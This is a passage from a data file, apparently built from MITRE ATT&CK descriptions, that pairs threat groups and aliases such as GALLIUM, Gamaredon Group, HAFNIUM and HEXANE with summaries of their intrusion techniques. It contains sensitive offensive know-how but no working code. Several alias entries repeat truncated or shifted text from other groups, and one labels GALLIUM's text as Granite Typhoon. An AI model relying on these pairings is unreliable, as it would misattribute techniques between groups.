Kitten has base64 encoded payloads to avoid detection., Fox Kitten has used prodump to dump credentials from LSASS., Fox Kitten has used Volume Shadow Copy to access credential information from NTDS., Fox Kitten has used protocol tunneling for communication and RDP activity on compromised hosts through the use of open source tools such as ngrok and custom tool SSHMinion., Fox Kitten has used the open source reverse proxy tools including FRPC and Go Proxy to establish connections from C2 to local servers., Fox Kitten has accessed Registry hives ntuser.dat and UserClass.dat., Fox Kitten has used RDP to log in and move laterally in the target environment., Fox Kitten has used valid accounts to access SMB shares., Fox Kitten has used the PuTTY and Plink tools for lateral movement., Fox Kitten has installed TightVNC server and client on compromised servers and endpoints for lateral movement., Fox Kitten has used Angry IP Scanner to detect remote systems., Fox Kitten has used Scheduled Tasks for persistence and to load and execute a reverse proxy binary., Fox Kitten has installed web shells on compromised hosts to maintain access., Fox Kitten has accessed files to gain valid credentials., Fox Kitten has used valid credentials with various services during lateral movement., Fox Kitten has used Amazon Web Services to host C2.",
    "UNC757": " Fox Kitten has accessed ntuser.dat and UserClass.dat on compromised hosts., Fox Kitten has used the Softerra LDAP browser to browse documentation on service accounts., Fox Kitten has used 7-Zip to archive data., Fox Kitten has used Google Chrome bookmarks to identify internal resources and assets., Fox Kitten has brute forced RDP credentials., Fox Kitten has used a Perl reverse shell to communicate with C2., Fox Kitten has used PowerShell scripts to access credential data., Fox Kitten has used cmd.exe likely as a password changing mechanism., Fox Kitten has created a local user account with administrator privileges., Fox Kitten has used scripts to access credential information from the KeePass database., Fox Kitten has obtained files from the victim's cloud storage instances., Fox Kitten has accessed victim security and IT environments and Microsoft Teams to mine valuable information., Fox Kitten has searched local system resources to access sensitive documents., Fox Kitten has searched network shares to access sensitive documents., Fox Kitten has created KeyBase accounts to communicate with ransomware victims., Fox Kitten has used a Twitter account to communicate with ransomware victims., Fox Kitten has used sticky keys to launch a command prompt., Fox Kitten has exploited known vulnerabilities in Fortinet, PulseSecure, and Palo Alto VPN appliances., Fox Kitten has exploited known vulnerabilities in remote services including RDP., Fox Kitten has used WizTree to obtain network files and directory listings., Fox Kitten has downloaded additional tools including PsExec directly to endpoints., Fox Kitten has named the task for a reverse proxy lpupdate to appear legitimate., Fox Kitten has named binaries and configuration files svhost and dllhost respectively to appear legitimate., Fox Kitten has used tools including NMAP to conduct broad scanning to identify open ports., Fox Kitten has base64 encoded scripts to avoid detection.",
    "GALLIUM": "GALLIUM is a cyberespionage group that has been active since at least 2012, primarily targeting telecommunications companies, financial institutions, and government entities in Afghanistan, Australia, Belgium, Cambodia, Malaysia, Mozambique, the Philippines, Russia, and Vietnam. This group is particularly known for launching Operation Soft Cell, a long-term campaign targeting telecommunications providers. Security researchers have identified GALLIUM as a likely Chinese state-sponsored group, based in part on tools used and TTPs commonly associated with Chinese threat actors., , GALLIUM has used Taiwan-based servers that appear to be exclusive to GALLIUM., GALLIUM used WinRAR to compress and encrypt stolen data prior to exfiltration., GALLIUM used PowerShell for execution to assist in lateral movement as well as for dumping credentials stored on compromised machines., GALLIUM used the Windows command shell to execute commands., GALLIUM created high-privileged domain user accounts to maintain access to victim networks., GALLIUM collected data from the victim's local system, including password hashes from the SAM hive in the Registry., GALLIUM compressed and staged files in multi-part archives in the Recycle Bin prior to exfiltration., GALLIUM used Web shells and HTRAN for C2 and to exfiltrate data., GALLIUM exploited a publicly-facing servers including Wildfly/JBoss servers to gain access to the network., GALLIUM has used VPN services, including SoftEther VPN, to access and maintain persistence in victim environments., GALLIUM used DLL side-loading to covertly load PoisonIvy into memory on the victim machine., GALLIUM dropped additional tools to victims during their operation, including portqry.exe, a renamed cmd.exe file, winrar, and HTRAN., GALLIUM has used PsExec to move laterally between hosts in the target network., GALLIUM used a renamed cmd.exe file to evade detection., GALLIUM used a modified version of HTRAN in which they obfuscated strings such as debug messages in an apparent attempt to evade detection., GALLIUM packed some payloads using different types of packers, both known and custom., GALLIUM ensured each payload had a unique hash, including by using different types of packers., GALLIUM has used a variety of widely-available tools, which in some cases they modified to add functionality and/or subvert antimalware solutions., GALLIUM used a modified version of Mimikatz along with a PowerShell-based Mimikatz to dump credentials on the victim machines., GALLIUM used reg commands to dump specific hives from the Windows Registry, such as the SAM hive, and obtain password hashes., GALLIUM used a modified version of HTRAN to redirect connections between networks., GALLIUM used a modified version of NBTscan to identify available NetBIOS name servers over the network as well as ping to identify remote systems., GALLIUM established persistence for PoisonIvy by created a scheduled task., GALLIUM used Web shells to persist in victim environments and assist in execution and exfiltration., GALLIUM has used stolen certificates to sign its tools including those from Whizzimo LLC., GALLIUM used ipconfig /all to obtain information about the victim network configuration. The group also ran a modified version of NBTscan to identify available NetBIOS name servers., GALLIUM used netstat -oan to obtain information about the victim network connections., GALLIUM used whoami and query user to obtain information about the victim user., GALLIUM used dumped hashes to authenticate to other machines via pass the hash., GALLIUM leveraged valid accounts to maintain access to a victim network., GALLIUM used WMI for execution to assist in lateral movement as well as for installing tools across multiple assets.",
    "Granite Typhoon": "Security researchers have identified GALLIUM as a likely Chinese state-sponsored group, based in part on tools used and TTPs commonly associated with Chinese threat actors., , GALLIUM has used Taiwan-based servers that appear to be exclusive to GALLIUM., GALLIUM used WinRAR to compress and encrypt stolen data prior to exfiltration., GALLIUM used PowerShell for execution to assist in lateral movement as well as for dumping credentials stored on compromised machines., GALLIUM used the Windows command shell to execute commands., GALLIUM created high-privileged domain user accounts to maintain access to victim networks., GALLIUM collected data from the victim's local system, including password hashes from the SAM hive in the Registry., GALLIUM compressed and staged files in multi-part archives in the Recycle Bin prior to exfiltration., GALLIUM used Web shells and HTRAN for C2 and to exfiltrate data., GALLIUM exploited a publicly-facing servers including Wildfly/JBoss servers to gain access to the network., GALLIUM has used VPN services, including SoftEther VPN, to access and maintain persistence in victim environments., GALLIUM used DLL side-loading to covertly load PoisonIvy into memory on the victim machine., GALLIUM dropped additional tools to victims during their operation, including portqry.exe, a renamed cmd.exe file, winrar, and HTRAN., GALLIUM has used PsExec to move laterally between hosts in the target network., GALLIUM used a renamed cmd.exe file to evade detection., GALLIUM used a modified version of HTRAN in which they obfuscated strings such as debug messages in an apparent attempt to evade detection., GALLIUM packed some payloads using different types of packers, both known and custom., GALLIUM ensured each payload had a unique hash, including by using different types of packers., GALLIUM has used a variety of widely-available tools, which in some cases they modified to add functionality and/or subvert antimalware solutions., GALLIUM used a modified version of Mimikatz along with a PowerShell-based Mimikatz to dump credentials on the victim machines., GALLIUM used reg commands to dump specific hives from the Windows Registry, such as the SAM hive, and obtain password hashes.",
    "Gallmaker": "Gallmaker is a cyberespionage group that has targeted victims in the Middle East and has been active since at least December 2017. The group has mainly targeted victims in the defense, military, and government sectors., Gallmaker has used WinZip, likely to archive data prior to exfiltration., Gallmaker used PowerShell to download additional payloads and for execution., Gallmaker attempted to exploit Microsoft’s DDE protocol in order to gain access to victim machines and for execution., Gallmaker obfuscated shellcode used during execution., Gallmaker sent emails with malicious Microsoft Office documents attached., Gallmaker sent victims a lure document with a warning that asked victims to 'enable content' for execution.",
    "Gamaredon Group": "Gamaredon Group is a suspected Russian cyber espionage threat group that has targeted military, NGO, judiciary, law enforcement, and non-profit organizations in Ukraine since at least 2013. The name Gamaredon Group comes from a misspelling of the word 'Armageddon', which was detected in the adversary's early campaigns., In November 2021, the Ukrainian government publicly attributed Gamaredon Group to Russia's Federal Security Service (FSB) Center 18., , , , , , , , Gamaredon Group has registered multiple domains to facilitate payload staging and C2., Gamaredon Group has used VPS hosting providers for infrastructure outside of Russia., Gamaredon Group has used HTTP and HTTPS for C2 communications., Gamaredon Group has deployed scripts on compromised systems that automatically scan for interesting documents., Gamaredon Group has used modules that automatically upload gathered documents to the C2 server., Gamaredon Group tools have registered Run keys in the registry to give malicious VBS files persistence., Gamaredon Group has used obfuscated PowerShell scripts for staging., Gamaredon Group has used various batch scripts to establish C2 and download additional files. Gamaredon Group's backdoor malware has also been written to a batch file., Gamaredon Group has embedded malicious macros in document templates, which executed VBScript. Gamaredon Group has also delivered Microsoft Outlook VBA projects with embedded macros., Gamaredon Group has collected files from infected systems and uploaded them to a C2 server., Gamaredon Group malware has collected Microsoft Office documents from mapped network drives., A Gamaredon Group file stealer has the capability to steal data from newly connected logical volumes on a system, including USB drives., Gamaredon Group has used obfuscated VBScripts with randomly generated variable names and concatenated strings. , Gamaredon Group has left taunting images and messages on the victims' desktops as proof of system access., Gamaredon Group tools decrypted additional payloads from the C2. Gamaredon Group has also decoded base64-encoded source code of a downloader. Additionally, Gamaredon Group has decoded Telegram content to reveal the IP address for C2 communications. , Gamaredon Group has used tools to delete files and folders from victims' desktops and profiles., Gamaredon Group has incorporated dynamic DNS domains in its infrastructure., Gamaredon Group has used fast flux DNS to mask their command and control channel behind rotating IP addresses., Gamaredon Group has used geoblocking to limit downloads of the malicious file to specific geographic locations. , A Gamaredon Group file stealer can transfer collected files to a hardcoded C2 server., Gamaredon Group macros can scan for Microsoft Word and Excel files to inject with additional malicious macros. Gamaredon Group has also used its backdoors to automatically list interesting files (such as Office documents) found on a system. , Gamaredon Group has used hidcon to run batch files in a hidden console window., Gamaredon Group has delivered macros which can tamper with Microsoft Office security settings. , Gamaredon Group tools can delete files used during an operation., Gamaredon Group has downloaded additional malware and tools onto a compromised host. For example, Gamaredon Group uses a backdoor script to retrieve and decode additional payloads once in victim environments. , Gamaredon Group malware can insert malicious macros into documents using a Microsoft.Office.Interop object. , Gamaredon Group has used an Outlook VBA module on infected systems to send phishing emails with malicious attachments to other employees within the organization., Gamaredon Group has used legitimate process names to hide malware including svchosst., Gamaredon Group has removed security settings for VBA macro execution by changing registry values HKCU/Software/Microsoft/Office/<version>/<product>/Security/VBAWarnings and HKCU/Software/Microsoft/Office/<version>/<product>/Security/AccessVBOM., Gamaredon Group malware has used CreateProcess to launch additional malicious components., Gamaredon Group has delivered self-extracting 7z archive files within malicious document attachments., Gamaredon Group has obfuscated .NET executables by inserting junk code. , Gamaredon Group has compiled the source code for a downloader directly on the infected system using the built-in Microsoft.CSharp.CSharpCodeProvider class. , Gamaredon Group has used obfuscated or encrypted scripts., Gamaredon Group has used various legitimate tools, such as mshta.exe and Reg, and services during operations. , Gamaredon Group has inserted malicious macros into existing documents, providing persistence when they are reopened. Gamaredon Group has loaded the group's previously delivered VBA project by relaunching Microsoft Outlook with the /altvba option, once the Application.Startup event is received., Gamaredon Group tools have contained an application to check performance of USB flash drives. Gamaredon Group has also used malware to scan for removable drives., Gamaredon Group has delivered spearphishing emails with malicious attachments to targets., Gamaredon Group has used tools to enumerate processes on target hosts including Process Explorer., Gamaredon Group has used VNC tools, including UltraVNC, to remotely interact with compromised hosts., Gamaredon Group has created scheduled tasks to launch executables after a designated number of minutes have passed. , Gamaredon Group's malware can take screenshots of the compromised computer every minute. , Gamaredon Group has registered domains to stage payloads., Gamaredon Group has used mshta.exe to execute malicious files. , Gamaredon Group malware has used rundll32 to launch additional malicious components., A Gamaredon Group file stealer can gather the victim's computer name and drive serial numbers to send to a C2 server., Gamaredon Group has tested connectivity between a compromised machine and a C2 server using  Ping with commands such as CSIDL_SYSTEM/cmd.exe /c ping -n 1., A Gamaredon Group file stealer can gather the victim's username to send to a C2 server., Gamaredon Group has injected malicious macros into all Word and Excel documents on mapped network drives., Gamaredon Group has used DOCX files to download malicious DOT document templates and has used RTF template injection to download malicious payloads. Gamaredon Group can also inject malicious macros or remote templates into documents already present on compromised systems., Gamaredon Group has attempted to get users to click on a link pointing to a malicious HTML file leading to follow-on malicious content. , Gamaredon Group has attempted to get users to click on Office attachments with malicious macros embedded., Gamaredon Group has used GitHub repositories for downloaders which will be obtained by the group's .NET executable on the compromised system. , Gamaredon Group has used Telegram Messenger content to discover the IP address for C2 communications., Gamaredon Group has used WMI to execute scripts used for discovery and for determining the C2 IP address.",
    "IRON TILDEN": "Gamaredon Group has used VPS hosting providers for infrastructure outside of Russia., Gamaredon Group has used HTTP and HTTPS for C2 communications., Gamaredon Group has deployed scripts on compromised systems that automatically scan for interesting documents., Gamaredon Group has used modules that automatically upload gathered documents to the C2 server., Gamaredon Group tools have registered Run keys in the registry to give malicious VBS files persistence., Gamaredon Group has used obfuscated PowerShell scripts for staging., Gamaredon Group has used various batch scripts to establish C2 and download additional files. Gamaredon Group's backdoor malware has also been written to a batch file., Gamaredon Group has embedded malicious macros in document templates, which executed VBScript. Gamaredon Group has also delivered Microsoft Outlook VBA projects with embedded macros., Gamaredon Group has collected files from infected systems and uploaded them to a C2 server., Gamaredon Group malware has collected Microsoft Office documents from mapped network drives., A Gamaredon Group file stealer has the capability to steal data from newly connected logical volumes on a system, including USB drives., Gamaredon Group has used obfuscated VBScripts with randomly generated variable names and concatenated strings. , Gamaredon Group has left taunting images and messages on the victims' desktops as proof of system access., Gamaredon Group tools decrypted additional payloads from the C2. Gamaredon Group has also decoded base64-encoded source code of a downloader. Additionally, Gamaredon Group has decoded Telegram content to reveal the IP address for C2 communications. , Gamaredon Group has used tools to delete files and folders from victims' desktops and profiles., Gamaredon Group has incorporated dynamic DNS domains in its infrastructure., Gamaredon Group has used fast flux DNS to mask their command and control channel behind rotating IP addresses., Gamaredon Group has used geoblocking to limit downloads of the malicious file to specific geographic locations. , A Gamaredon Group file stealer can transfer collected files to a hardcoded C2 server., Gamaredon Group macros can scan for Microsoft Word and Excel files to inject with additional malicious macros. Gamaredon Group has also used its backdoors to automatically list interesting files (such as Office documents) found on a system. , Gamaredon Group has used hidcon to run batch files in a hidden console window.",
    "Primitive Bear": "Gamaredon Group has used tools to delete files and folders from victims' desktops and profiles., Gamaredon Group has incorporated dynamic DNS domains in its infrastructure., Gamaredon Group has used fast flux DNS to mask their command and control channel behind rotating IP addresses., Gamaredon Group has used geoblocking to limit downloads of the malicious file to specific geographic locations. , A Gamaredon Group file stealer can transfer collected files to a hardcoded C2 server., Gamaredon Group macros can scan for Microsoft Word and Excel files to inject with additional malicious macros. Gamaredon Group has also used its backdoors to automatically list interesting files (such as Office documents) found on a system. , Gamaredon Group has used hidcon to run batch files in a hidden console window., Gamaredon Group has delivered macros which can tamper with Microsoft Office security settings. , Gamaredon Group tools can delete files used during an operation., Gamaredon Group has downloaded additional malware and tools onto a compromised host. For example, Gamaredon Group uses a backdoor script to retrieve and decode additional payloads once in victim environments. , Gamaredon Group malware can insert malicious macros into documents using a Microsoft.Office.Interop object. , Gamaredon Group has used an Outlook VBA module on infected systems to send phishing emails with malicious attachments to other employees within the organization., Gamaredon Group has used legitimate process names to hide malware including svchosst., Gamaredon Group has removed security settings for VBA macro execution by changing registry values HKCU/Software/Microsoft/Office/<version>/<product>/Security/VBAWarnings and HKCU/Software/Microsoft/Office/<version>/<product>/Security/AccessVBOM., Gamaredon Group malware has used CreateProcess to launch additional malicious components., Gamaredon Group has delivered self-extracting 7z archive files within malicious document attachments., Gamaredon Group has obfuscated .NET executables by inserting junk code. , Gamaredon Group has compiled the source code for a downloader directly on the infected system using the built-in Microsoft.CSharp.CSharpCodeProvider class. , Gamaredon Group has used obfuscated or encrypted scripts., Gamaredon Group has used various legitimate tools, such as mshta.exe and Reg, and services during operations. , Gamaredon Group has inserted malicious macros into existing documents, providing persistence when they are reopened. Gamaredon Group has loaded the group's previously delivered VBA project by relaunching Microsoft Outlook with the /altvba option, once the Application.Startup event is received., Gamaredon Group tools have contained an application to check performance of USB flash drives. Gamaredon Group has also used malware to scan for removable drives., Gamaredon Group has delivered spearphishing emails with malicious attachments to targets., Gamaredon Group has used tools to enumerate processes on target hosts including Process Explorer., Gamaredon Group has used VNC tools, including UltraVNC, to remotely interact with compromised hosts., Gamaredon Group has created scheduled tasks to launch executables after a designated number of minutes have passed. , Gamaredon Group's malware can take screenshots of the compromised computer every minute.",
    "ACTINIUM": "Gamaredon Group has used obfuscated or encrypted scripts., Gamaredon Group has used various legitimate tools, such as mshta.exe and Reg, and services during operations. , Gamaredon Group has inserted malicious macros into existing documents, providing persistence when they are reopened. Gamaredon Group has loaded the group's previously delivered VBA project by relaunching Microsoft Outlook with the /altvba option, once the Application.Startup event is received., Gamaredon Group tools have contained an application to check performance of USB flash drives. Gamaredon Group has also used malware to scan for removable drives., Gamaredon Group has delivered spearphishing emails with malicious attachments to targets., Gamaredon Group has used tools to enumerate processes on target hosts including Process Explorer., Gamaredon Group has used VNC tools, including UltraVNC, to remotely interact with compromised hosts., Gamaredon Group has created scheduled tasks to launch executables after a designated number of minutes have passed. , Gamaredon Group's malware can take screenshots of the compromised computer every minute. , Gamaredon Group has registered domains to stage payloads., Gamaredon Group has used mshta.exe to execute malicious files. , Gamaredon Group malware has used rundll32 to launch additional malicious components., A Gamaredon Group file stealer can gather the victim's computer name and drive serial numbers to send to a C2 server., Gamaredon Group has tested connectivity between a compromised machine and a C2 server using  Ping with commands such as CSIDL_SYSTEM/cmd.exe /c ping -n 1., A Gamaredon Group file stealer can gather the victim's username to send to a C2 server., Gamaredon Group has injected malicious macros into all Word and Excel documents on mapped network drives., Gamaredon Group has used DOCX files to download malicious DOT document templates and has used RTF template injection to download malicious payloads. Gamaredon Group can also inject malicious macros or remote templates into documents already present on compromised systems., Gamaredon Group has attempted to get users to click on a link pointing to a malicious HTML file leading to follow-on malicious content. , Gamaredon Group has attempted to get users to click on Office attachments with malicious macros embedded., Gamaredon Group has used GitHub repositories for downloaders which will be obtained by the group's .NET executable on the compromised system. , Gamaredon Group has used Telegram Messenger content to discover the IP address for C2 communications., Gamaredon Group has used WMI to execute scripts used for discovery and for determining the C2 IP address.",
    "GCMAN": "GCMAN is a threat group that focuses on targeting banks for the purpose of transferring money to e-currency services. , GCMAN uses Putty for lateral movement., GCMAN uses VNC for lateral movement.",
    "GOLD SOUTHFIELD": "GOLD SOUTHFIELD is a financially motivated threat group active since at least 2018 that operates the REvil Ransomware-as-a Service (RaaS). GOLD SOUTHFIELD provides backend infrastructure for affiliates recruited on underground forums to perpetrate high value deployments. By early 2020, GOLD SOUTHFIELD started capitalizing on the new trend of stealing data and further extorting the victim to pay for their data to not get publicly leaked., , GOLD SOUTHFIELD has staged and executed PowerShell scripts on compromised hosts., GOLD SOUTHFIELD has exploited Oracle WebLogic vulnerabilities for initial compromise., GOLD SOUTHFIELD has used publicly-accessible RDP and remote management and monitoring (RMM) servers to gain access to victim machines. , GOLD SOUTHFIELD has executed base64 encoded PowerShell scripts on compromised hosts., GOLD SOUTHFIELD has conducted malicious spam (malspam) campaigns to gain access to victim's machines., GOLD SOUTHFIELD has used the cloud-based remote management and monitoring tool 'ConnectWise Control' to deploy REvil., GOLD SOUTHFIELD has used the remote monitoring and management tool ConnectWise to obtain screen captures from victim's machines., GOLD SOUTHFIELD has distributed ransomware by backdooring software installers via a strategic web compromise of the site hosting Italian WinRAR., GOLD SOUTHFIELD has breached Managed Service Providers (MSP's) to deliver malware to MSP customers.",
    "Gorgon Group": "Gorgon Group is a threat group consisting of members who are suspected to be Pakistan-based or have other connections to Pakistan. The group has performed a mix of criminal and targeted attacks, including campaigns against government organizations in the United Kingdom, Spain, Russia, and the United States. , Gorgon Group malware can create a .lnk file and add a Registry Run key to establish persistence., Gorgon Group malware can create a .lnk file and add a Registry Run key to establish persistence., Gorgon Group malware can use PowerShell commands to download and execute a payload and open a decoy document on the victim’s machine., Gorgon Group malware can use cmd.exe to download and execute payloads and to execute commands on the system., Gorgon Group has used macros in Spearphishing Attachments as well as executed VBScripts on victim machines., Gorgon Group malware can decode contents from a payload that was Base64 encoded and write the contents to a file., Gorgon Group has used -W Hidden to conceal PowerShell windows by setting the WindowStyle parameter to hidden. , Gorgon Group malware can attempt to disable security features in Microsoft Office and Windows Defender using the taskkill command., Gorgon Group malware can download additional files from C2 servers., Gorgon Group malware can deactivate security mechanisms in Microsoft Office by editing several keys and values under HKCU/Software/Microsoft/Office/., Gorgon Group malware can leverage the Windows API call, CreateProcessA(), for execution., Gorgon Group has obtained and used tools such as QuasarRAT and Remcos., Gorgon Group sent emails to victims with malicious Microsoft Office documents attached., Gorgon Group malware can download a remote access tool, ShiftyBug, and inject into another process., Gorgon Group malware can use process hollowing to inject one of its trojans into another process., Gorgon Group attempted to get users to launch malicious Microsoft Office attachments delivered via spearphishing emails.",
    "Group5": "Group5 is a threat group with a suspected Iranian nexus, though this attribution is not definite. The group has targeted individuals connected to the Syrian opposition via spearphishing and watering holes, normally using Syrian and Iranian themes. Group5 has used two commonly available remote access tools (RATs), njRAT and NanoCore, as well as an Android RAT, DroidJack. , Malware used by Group5 is capable of remotely deleting files from victims., Malware used by Group5 is capable of capturing keystrokes., Group5 disguised its malicious binaries with several layers of obfuscation, including encrypting the files., Malware used by Group5 is capable of watching the victim's screen.",
    "HAFNIUM": "HAFNIUM is a likely state-sponsored cyber espionage group operating out of China that has been active since at least January 2021. HAFNIUM primarily targets entities in the US across a number of industry sectors, including infectious disease researchers, law firms, higher education institutions, defense contractors, policy think tanks, and NGOs., , , HAFNIUM has granted privileges to domain accounts., HAFNIUM has operated from leased virtual private servers (VPS) in the United States., HAFNIUM has acquired web services for use in C2 and exfiltration., HAFNIUM has used open-source C2 frameworks, including Covenant., HAFNIUM has used 7-Zip and WinRAR to compress stolen files for exfiltration., HAFNIUM has used the Exchange Power Shell module Set-OabVirtualDirectoryPowerShell to export mailbox data., HAFNIUM has used cmd.exe to execute commands on the victim's machine., HAFNIUM has created domain accounts., HAFNIUM has used ASCII encoding for C2 traffic., HAFNIUM has collected data and files from a compromised machine., HAFNIUM has used web shells to export mailbox data., HAFNIUM has exfiltrated data to file sharing sites, including MEGA., HAFNIUM has exploited CVE-2021-44228 in Log4j and CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, and CVE-2021-27065  to compromise on-premises versions of Microsoft Exchange Server. , HAFNIUM has searched file contents on a compromised host., HAFNIUM has interacted with Office 365 tenants to gather details regarding target's environments., HAFNIUM has collected e-mail addresses for users they intended to target., HAFNIUM gathered the fully qualified domain names (FQDNs) for targeted Exchange servers in the victim's environment., HAFNIUM has obtained IP addresses for publicly-accessible Exchange servers., HAFNIUM has hidden files on a compromised host., HAFNIUM has downloaded malware and tools--including Nishang and PowerCat--onto a compromised host. , HAFNIUM has used TCP for C2., HAFNIUM has used procdump to dump the LSASS process memory., HAFNIUM has stolen copies of the Active Directory database (NTDS.DIT)., HAFNIUM has used tasklist to enumerate processes., HAFNIUM has enumerated domain controllers using net group 'Domain computers' and nltest /dclist., HAFNIUM has deployed multiple web shells on compromised servers including SIMPLESEESHARP, SPORTSBALL, China Chopper, and ASPXSpy. , HAFNIUM has used rundll32 to load malicious DLLs., HAFNIUM has collected IP information via IPInfo., HAFNIUM has checked for network connectivity from a compromised host using ping, including attempts to contact google[.]com., HAFNIUM has used whoami to gather user information., HAFNIUM has used the NT AUTHORITY/SYSTEM account to create files on Exchange servers.",
    "Operation Exchange Marauder": " HAFNIUM has used 7-Zip and WinRAR to compress stolen files for exfiltration., HAFNIUM has used the Exchange Power Shell module Set-OabVirtualDirectoryPowerShell to export mailbox data., HAFNIUM has used cmd.exe to execute commands on the victim's machine., HAFNIUM has created domain accounts., HAFNIUM has used ASCII encoding for C2 traffic., HAFNIUM has collected data and files from a compromised machine., HAFNIUM has used web shells to export mailbox data., HAFNIUM has exfiltrated data to file sharing sites, including MEGA., HAFNIUM has exploited CVE-2021-44228 in Log4j and CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, and CVE-2021-27065  to compromise on-premises versions of Microsoft Exchange Server. , HAFNIUM has searched file contents on a compromised host., HAFNIUM has interacted with Office 365 tenants to gather details regarding target's environments., HAFNIUM has collected e-mail addresses for users they intended to target., HAFNIUM gathered the fully qualified domain names (FQDNs) for targeted Exchange servers in the victim's environment., HAFNIUM has obtained IP addresses for publicly-accessible Exchange servers., HAFNIUM has hidden files on a compromised host., HAFNIUM has downloaded malware and tools--including Nishang and PowerCat--onto a compromised host. , HAFNIUM has used TCP for C2., HAFNIUM has used procdump to dump the LSASS process memory., HAFNIUM has stolen copies of the Active Directory database (NTDS.DIT)., HAFNIUM has used tasklist to enumerate processes.",
    "HEXANE": "HEXANE is a cyber espionage threat group that has targeted oil & gas, telecommunications, aviation, and internet service provider organizations since at least 2017. Targeted companies have been located in the Middle East and Africa, including Israel, Saudi Arabia, Kuwait, Morocco, and Tunisia. HEXANE's TTPs appear similar to APT33 and OilRig but due to differences in victims and tools it is tracked as a separate entity., , , , HEXANE probed victim infrastructure in support of HomeLand Justice., During HomeLand Justice, threat actors used custom tooling to acquire tokens using ImpersonateLoggedOnUser/SetThreadToken., During HomeLand Justice, threat actors used compromised Exchange accounts to search mailboxes for administrator accounts., During HomeLand Justice, threat actors added the ApplicationImpersonation management role to accounts under their control to impersonate users and take ownership of targeted mailboxes., HEXANE has registered and operated domains for campaigns, often using a security or web technology theme or impersonating the targeted organization., HEXANE has set up custom DNS servers to send commands to compromised hosts via TXT records., HEXANE has used a PowerShell-based keylogging tool to capture the window title., HEXANE has used brute force attacks to compromise valid credentials., HEXANE has used password spraying attacks to obtain valid credentials., HEXANE has used PowerShell-based tools and scripts for discovery and collection on compromised hosts.During HomeLand Justice, threat actors used PowerShell cmdlets New-MailboxSearch and Get-Recipient for discovery., During HomeLand Justice, threat actors used PowerShell cmdlets New-MailboxSearch and Get-Recipient for discovery., During HomeLand Justice, threat actors used Windows batch files for persistence and execution., HEXANE has used a VisualBasic script named MicrosoftUpdator.vbs for execution of a PowerShell keylogger., HEXANE has used compromised accounts to send spearphishing emails., HEXANE has run cmdkey on victim machines to identify stored credentials., HEXANE has used a Mimikatz-based tool and a PowerShell script to steal passwords from Google Chrome., During HomeLand Justice, threat actors used ROADSWEEP ransomware to encrypt files on targeted systems., During HomeLand Justice, threat actors used a version of ZeroCleare to wipe disk drives on targeted hosts., During HomeLand Justice, threat actors made multiple HTTP POST requests to the Exchange servers of the victim organization to transfer data., HEXANE has established fraudulent LinkedIn accounts impersonating HR department employees to target potential victims with fake job offers., HEXANE has established email accounts for use in domain registration including for ProtonMail addresses., HEXANE has used WMI event subscriptions for persistence., During HomeLand Justice, threat actors used HTTP to transfer data from compromised Exchange servers., HEXANE has used cloud services, including OneDrive, for data exfiltration., For HomeLand Justice, threat actors exploited CVE-2019-0604 in Microsoft SharePoint for initial access., HEXANE has identified specific potential victims at targeted organizations., HEXANE has targeted executives, human resources staff, and IT personnel for spearphishing., HEXANE has identified executives, HR, and IT staff at victim organizations for further targeting., During HomeLand Justice, threat actors modified and disabled components of endpoint detection and response (EDR) solutions including Microsoft Defender Antivirus., During HomeLand Justice, threat actors deleted Windows events and application logs., HEXANE has downloaded additional payloads and malicious scripts onto a compromised host.During HomeLand Justice, threat actors used web shells to download files to compromised infrastructure., During HomeLand Justice, threat actors used web shells to download files to compromised infrastructure., HEXANE has used a PowerShell-based keylogger named kl.ps1., HEXANE has conducted internal spearphishing attacks against executives, HR, and IT personnel to gain information and access., During HomeLand Justice, threat actors initiated a process named Mellona.exe to spread the ROADSWEEP file encryptor and a persistence script to a list of internal machines., During HomeLand Justice, threat actors renamed ROADSWEEP to GoXML.exe and ZeroCleare to cl.exe., During HomeLand Justice, threat actors executed the Advanced Port Scanner tool on compromised systems., HEXANE has used Base64-encoded scripts., HEXANE has acquired, and sometimes customized, open source tools such as Mimikatz, Empire, VNC remote access software, and DIG.net.During HomeLand Justice, threat actors used tools including Advanced Port Scanner, Mimikatz, and Impacket., During HomeLand Justice, threat actors used tools including Advanced Port Scanner, Mimikatz, and Impacket., During HomeLand Justice, threat actors used tools with legitimate code signing certificates. , During HomeLand Justice, threat actors dumped LSASS memory on compromised hosts., HEXANE has run net localgroup to enumerate local groups., HEXANE has enumerated processes on targeted systems., HEXANE has used remote desktop sessions for lateral movement.During HomeLand Justice, threat actors primarily used RDP for lateral movement in the victim environment., During HomeLand Justice, threat actors primarily used RDP for lateral movement in the victim environment., During HomeLand Justice, threat actors used SMB for lateral movement., HEXANE has used net view to enumerate domain machines., HEXANE has used a scheduled task to establish persistence for a keylogger., For HomeLand Justice, threat actors used .aspx webshells named pickers.aspx, error4.aspx, and ClientBin.aspx, to maintain persistence., HEXANE has enumerated programs installed on an infected machine., HEXANE has staged malware on fraudulent websites set up to impersonate targeted organizations., HEXANE has collected the hostname of a compromised machine., HEXANE has used Ping and tracert for network discovery., HEXANE has used tools including BITSAdmin to test internet connectivity from compromised hosts., HEXANE has used netstat to monitor connections to specific ports., HEXANE has run whoami on compromised machines to identify the current user., HEXANE has relied on victim's executing malicious file attachments delivered via email or embedded within actor-controlled websites to deliver malware., During HomeLand Justice, threat actors used the built-in administrator account to move laterally using RDP and Impacket., HEXANE has used cloud services, including OneDrive, for C2., During HomeLand Justice, threat actors used WMI to modify Windows Defender settings.",
    "Lyceum": " During HomeLand Justice, threat actors added the ApplicationImpersonation management role to accounts under their control to impersonate users and take ownership of targeted mailboxes., HEXANE has registered and operated domains for campaigns, often using a security or web technology theme or impersonating the targeted organization., HEXANE has set up custom DNS servers to send commands to compromised hosts via TXT records., HEXANE has used a PowerShell-based keylogging tool to capture the window title., HEXANE has used brute force attacks to compromise valid credentials., HEXANE has used password spraying attacks to obtain valid credentials., HEXANE has used PowerShell-based tools and scripts for discovery and collection on compromised hosts.During HomeLand Justice, threat actors used PowerShell cmdlets New-MailboxSearch and Get-Recipient for discovery., During HomeLand Justice, threat actors used PowerShell cmdlets New-MailboxSearch and Get-Recipient for discovery., During HomeLand Justice, threat actors used Windows batch files for persistence and execution., HEXANE has used a VisualBasic script named MicrosoftUpdator.vbs for execution of a PowerShell keylogger., HEXANE has used compromised accounts to send spearphishing emails., HEXANE has run cmdkey on victim machines to identify stored credentials., HEXANE has used a Mimikatz-based tool and a PowerShell script to steal passwords from Google Chrome., During HomeLand Justice, threat actors used ROADSWEEP ransomware to encrypt files on targeted systems., During HomeLand Justice, threat actors used a version of ZeroCleare to wipe disk 